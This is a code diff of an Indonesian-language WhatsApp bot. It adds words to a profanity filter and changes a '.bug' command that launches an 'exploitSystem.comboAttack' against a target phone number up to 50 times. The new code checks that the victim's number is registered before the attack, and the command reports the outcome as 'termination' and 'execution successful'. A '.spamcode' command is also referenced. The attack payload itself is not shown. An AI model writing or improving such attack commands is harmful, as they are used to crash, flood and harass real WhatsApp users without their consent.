@@ -1727,7 +1727,8 @@ const toxicWords = [
   'blowjob', 'handjob', 'cum', 'sperma', 'vagina', 'penis', 'koplak', 
   'ahh', 'enak mas', 'yatim', 'anak haram', 'ngewe', 'ewe', 'squirt',
   'anj', 'kont', 'bngst', 'kntol', 'mmk', 'bbi', 'jnck', 'lnte', 'bugil',
-  'telanjang', 'pentil', 'pantat', 'silit', 'asu', 'koclok'
+  'telanjang', 'pentil', 'pantat', 'silit', 'asu', 'koclok', 'cok', 'ndogok',
+  'pekok'
 ];
 
 
@@ -5956,7 +5957,7 @@ if (text.startsWith('.spamcode')) {
 
 
 
-// 🎯 FITUR .bug - SAMA PERSIS TEXTNYA KAYA SEBELUMNYA
+// 🎯 FITUR .bug - DENGAN VALIDASI NOMOR WHATSAPP
 if (body.startsWith('.bug')) {
     const args = body.trim().split(' ');
 
@@ -5979,10 +5980,21 @@ if (body.startsWith('.bug')) {
         return;
     }
     
+    // Format nomor
     if (targetNum.startsWith('0')) targetNum = '62' + targetNum.slice(1);
     if (!targetNum.startsWith('62')) targetNum = '62' + targetNum;
     
     const targetJid = targetNum + '@s.whatsapp.net';
+
+    // 🔴 **VALIDASI NOMOR ADA DI WA ATAU TIDAK**
+    try {
+        await sock.onWhatsApp(targetJid);
+    } catch {
+        await sock.sendMessage(from, { 
+            text: `𝗪𝗔𝗥𝗡𝗜𝗡𝗚: ${targetNum} 𝗧𝗜𝗗𝗔𝗞 𝗧𝗘𝗥𝗗𝗔𝗙𝗧𝗔𝗥 𝗗𝗜 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣`
+        });
+        return;
+    }
 
     // COUNT CHECK
     let count = 5; // DEFAULT 5
@@ -5993,7 +6005,7 @@ if (body.startsWith('.bug')) {
         if (count > 50) count = 50;
     }
 
-    // START MESSAGE - SAMA TEXTNYA
+    // START MESSAGE
     await sock.sendMessage(from, {
         text: `𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗜𝗡𝗚 𝗧𝗘𝗥𝗠𝗜𝗡𝗔𝗧𝗜𝗢𝗡\n𝗧𝗔𝗥𝗚𝗘𝗧: ${targetNum}\n𝗔𝗠𝗢𝗨𝗡𝗧: ${count}x`
     });
@@ -6001,7 +6013,7 @@ if (body.startsWith('.bug')) {
     // EXECUTE COMBO - SEMUA FUNC SEKALIGUS!
     let result = await exploitSystem.comboAttack(targetJid, count);
     
-    // RESULT - SAMA FORMATNYA
+    // RESULT
     if (result.success) {
         await sock.sendMessage(from, {
             text: `𝗘𝗫𝗘𝗖𝗨𝗧𝗜𝗢𝗡 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟\n𝗧𝗔𝗥𝗚𝗘𝗧: ${targetNum}\n𝗘𝗙𝗙𝗘𝗖𝗧𝗦: 𝗜𝗠𝗠𝗜𝗡𝗘𝗡𝗧`
